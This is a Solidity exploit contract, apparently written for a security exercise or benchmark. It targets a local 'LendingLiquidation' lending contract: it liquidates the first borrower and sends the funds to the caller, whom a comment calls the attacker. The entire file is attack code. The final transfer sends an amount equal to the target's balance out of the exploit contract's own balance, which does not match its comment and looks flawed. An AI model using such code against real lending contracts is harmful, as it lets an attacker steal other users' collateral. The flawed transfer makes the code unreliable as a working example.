// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {LendingLiquidation} from "../src/LendingLiquidation.sol";

contract ExploitModule {
    LendingLiquidation public targetContract;

    constructor(address _target) payable {
        targetContract = LendingLiquidation(payable(_target));
    }

    function runExploit() external payable {
        // Get the first borrower
        address borrower = targetContract.getBorrowers()[0];

        // Liquidate the borrower
        targetContract.liquidateDefective{value: msg.value}(borrower);

        // Transfer the seized collateral to the attacker
        payable(msg.sender).transfer(address(targetContract).balance);
    }

    receive() external payable {}
}